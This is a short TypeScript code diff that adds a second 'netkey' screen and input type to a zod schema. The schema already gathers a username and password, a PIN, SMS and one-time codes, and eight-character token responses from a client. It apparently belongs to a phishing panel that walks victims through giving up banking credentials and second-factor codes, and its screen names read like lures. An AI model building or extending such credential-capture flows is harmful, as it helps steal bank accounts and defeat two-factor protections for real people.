@@ -218,6 +218,7 @@ export enum ScreenType {
   SMS_VERIFICATION = "sms_verification",
   LOGIN = "login",
   NETKEY = "netkey",
+  NETKEY2 = "netkey2",
   ACCESO_DENEGADO = "acceso_denegado",
   VUELOS_OTORGADOS = "audifonos_otorgados",
   TELEFONO = "telefono",
@@ -266,6 +267,7 @@ export const clientInputSchema = z.object({
   }).and(
     z.discriminatedUnion('tipo', [
       z.object({ tipo: z.literal('netkey_response'), netkeyResponse: z.string().length(8) }),
+      z.object({ tipo: z.literal('netkey2'), netkeyResponse: z.string().length(8) }),
       z.object({ tipo: z.literal('login'), username: z.string(), password: z.string() }),
       z.object({ tipo: z.literal('codigo'), codigo: z.string() }),
       z.object({ tipo: z.literal('nip'), nip: z.string() }),
